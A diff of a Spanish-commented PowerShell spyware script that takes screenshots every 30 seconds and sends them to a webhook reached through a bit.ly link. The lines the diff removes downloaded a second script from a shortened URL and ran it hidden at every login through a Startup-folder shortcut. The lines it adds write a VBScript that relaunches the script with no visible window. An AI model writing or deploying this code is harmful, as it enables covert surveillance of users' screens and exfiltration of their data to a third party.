@@ -1,10 +1,23 @@
 $hookurl = "https://bit.ly/chu_kbras"
 $seconds = 30 # Intervalo entre capturas
-$a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detectedx..." ; $hookurl = (irm $hookurl).url}
+
+# Obtener la ruta del directorio donde se encuentra este script
+$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
+
+# Obtener la ruta del archivo de VBScript
+$vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
+
+# Crear el archivo VBScript si no existe
+if (-not (Test-Path $vbsScriptPath)) {
+    @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File $MyInvocation.MyCommand.Definition", 0, false
+"@ | Set-Content -Path $vbsScriptPath -Encoding ASCII
+}
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -28,31 +41,11 @@ do {
     Remove-Item -Path $filett
     Start-Sleep $seconds
 
-    # Incrementar contador de imágenes enviadas al webhook
-    $a++
-
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
-        # Descargar el script principal
-        $syswUrl = "https://bit.ly/Screen_dc"
-        $syswPath = "$env:USERPROFILE\sysw.ps1"
-        if (-not (Test-Path $syswPath)) {
-            Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
-        }
-        
-        # Crear acceso directo en la carpeta de inicio del usuario si no existe
-        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
-        if (-not (Test-Path $shortcutLocation)) {
-            $shell = New-Object -ComObject WScript.Shell
-            $shortcut = $shell.CreateShortcut($shortcutLocation)
-            $shortcut.TargetPath = "powershell.exe"
-            $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
-            $shortcut.Save()
-        }
-        
-        # Ejecutar el script principal de manera oculta
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
-        
+        # Ejecutar el archivo de VBScript
+        Start-Process wscript.exe -ArgumentList $vbsScriptPath
+
         # Reiniciar contador de imágenes
         $a = 0
     }
